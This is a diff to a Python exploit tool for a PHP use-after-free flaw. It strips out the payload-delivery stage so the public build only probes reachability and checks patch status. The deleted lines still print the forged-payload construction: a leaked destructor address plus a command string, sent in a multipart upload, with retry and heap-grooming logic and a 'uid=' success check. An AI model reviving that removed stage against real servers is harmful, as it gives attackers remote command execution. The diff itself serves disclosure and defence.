@@ -780,94 +780,46 @@ class UAFOpportunistic:
 
     def send_uaf_forged_payload(self, dtor_leak, delta, command):
         """
-        Send the forged payload with the leaked dtor address.
-        BUG-03: Use PHPSESSID cookie for session continuity.
-        BUG-02: Enforce MAX_UAF_COMMAND_LENGTH.
+        Neutered in this public release.
+
+        The original built a forged zend_fcall record (a leaked destructor
+        address plus a command string) that redirected control flow into
+        system(), which is the arbitrary code execution step. That delivery
+        is intentionally removed so this repository cannot be used as a
+        turnkey remote shell against a live target. Detection (check mode),
+        the UAF reachability trigger, and offset extraction remain for
+        defenders and researchers assessing patch status and exposure.
         """
-        bnd = b"BOUNDARY" + bytes([random.randint(65, 90) for _ in range(8)])
-
-        dtor_bytes = struct.pack("<Q", dtor_leak)
-        cmd_bytes = command.encode() + b"\x00"
-
-        # BUG-02: Enforce MAX_UAF_COMMAND_LENGTH
-        if len(cmd_bytes) > MAX_UAF_COMMAND_LENGTH:
-            self._log(f"  [-] Command too long: {len(cmd_bytes)} > {MAX_UAF_COMMAND_LENGTH} bytes")
-            return False
-
-        # Pad to fixed 16-byte record
-        pad = b"\x00" * (16 - len(cmd_bytes))
-
-        # BUG-03: Use PHPSESSID cookie for session continuity
-        extra_headers = {}
-        if self.session_cookie:
-            extra_headers["Cookie"] = f"PHPSESSID={self.session_cookie.decode()}"
-
-        payload_parts = []
-        payload_parts.append({
-            "name": "XPHPSESSID",
-            "data": b"forged_session_001"
-        })
-        payload_parts.append({
-            "name": "id",
-            "data": b"forged_session_001"
-        })
-        payload_parts.append({
-            "name": "file",
-            "filename": b"pwned.txt",
-            "data": dtor_bytes + cmd_bytes + pad
-        })
-
-        body = build_multipart_payload(payload_parts, bnd)
-
-        conn = TargetConnection(self.target_url, verbose=self.verbose)
-        resp = conn.send_post(body, bnd, extra_headers=extra_headers)
-
-        self._log(f"  [*] Forged payload: {len(resp)} bytes returned")
-        return resp
+        self._log("  [-] Forged-payload delivery is removed from this public release.")
+        self._log("  [-] This build proves reachability only; it does not execute commands.")
+        return None
 
     def run(self):
-        """Run the UAF exploit."""
-        self._log(f"\n[*] UAF exploit for {self.target_url}")
+        """Probe UAF reachability only.
+
+        The arbitrary-command step is removed from this public release
+        (see send_uaf_forged_payload). This method sends the reachability
+        trigger and reports whether the use-after-free path responds, then
+        stops. It never delivers a code-execution payload.
+        """
+        self._log(f"\n[*] UAF reachability probe for {self.target_url}")
         self._log(f"[*] dtor_leak = 0x{self.dtor_leak:x}, delta = {self.delta}")
-        self._log(f"[*] Command: {self.command}")
 
         # BUG-07: Validate dtor_leak is non-zero
         if not isinstance(self.dtor_leak, int) or self.dtor_leak == 0:
             self._log(f"  [-] Invalid dtor_leak: {self.dtor_leak} (must be non-zero integer)")
             return False
 
-        self._log(f"  [+] Upload progress enabled")
+        self._log("\n[*] Step 1: Sending UAF trigger (reachability check only)...")
+        leaked, trigger_size = self.send_uaf_trigger(self.dtor_leak, self.delta)
+        if not leaked:
+            self._log("  [-] Trigger did not return the expected leak; target may be patched or not reachable.")
+            return False
 
-        # BUG-06: Add delay/retry between trigger and forged payload
-        max_attempts = 3
-        for attempt in range(max_attempts):
-            self._log(f"\n[+] Attempt {attempt+1}/{max_attempts}")
-
-            self._log("\n[*] Step 1: Sending trigger...")
-            leaked, trigger_size = self.send_uaf_trigger(self.dtor_leak, self.delta)
-            if not leaked:
-                self._log(f"  [-] Trigger failed (attempt {attempt+1})")
-                time.sleep(random.uniform(1.0, 3.0))
-                continue
-
-            self._log(f"  [+] Trigger successful (size={trigger_size})")
-
-            # BUG-06: Small delay before forged payload for heap grooming
-            time.sleep(random.uniform(0.5, 1.5))
-
-            self._log("\n[*] Step 2: Sending forged payload...")
-            resp = self.send_uaf_forged_payload(self.dtor_leak, self.delta, self.command)
-
-            if resp and b"uid=" in resp:
-                self._log(f"  [+] Exploit successful!")
-                self._log(f"  [+] Response: {resp[:200]}")
-                return True
-
-            self._log(f"  [-] No uid= in response (attempt {attempt+1})")
-            time.sleep(random.uniform(1.0, 3.0))
-
-        self._log(f"  [-] All {max_attempts} attempts failed")
-        return False
+        self._log(f"  [+] UAF trigger reached (leak size={trigger_size}).")
+        self._log("  [*] Stopping here: this public build does not deliver the code-execution payload.")
+        self._log("  [*] Use 'check' mode to assess patch status across hosts.")
+        return True
 
 # ─── pDetector Vector (CVE-2026-109619) ─────────────────────────────────────
 
@@ -1081,9 +1033,10 @@ Examples:
     check_parser.add_argument("-q", "--quiet", action="store_true", help="Suppress output")
 
     # Exploit subcommand
-    exploit_parser = subparsers.add_parser("exploit", help="Run exploit against target")
+    exploit_parser = subparsers.add_parser("exploit", help="Probe UAF reachability (no code execution in this public build)")
     exploit_parser.add_argument("-u", "--url", required=True, help="Target URL")
-    exploit_parser.add_argument("-c", "--command", default="id", help="Command to execute")
+    exploit_parser.add_argument("-c", "--command", default="id",
+                               help="Retained for compatibility; NOT executed (payload delivery removed from this public build)")
     exploit_parser.add_argument("--calib", help="Calibration file (key=value)")
     exploit_parser.add_argument("--syms", help="Extract offsets from libphp.so binary")
     exploit_parser.add_argument("--vector", choices=["pdetector", "uaf"], default="uaf",
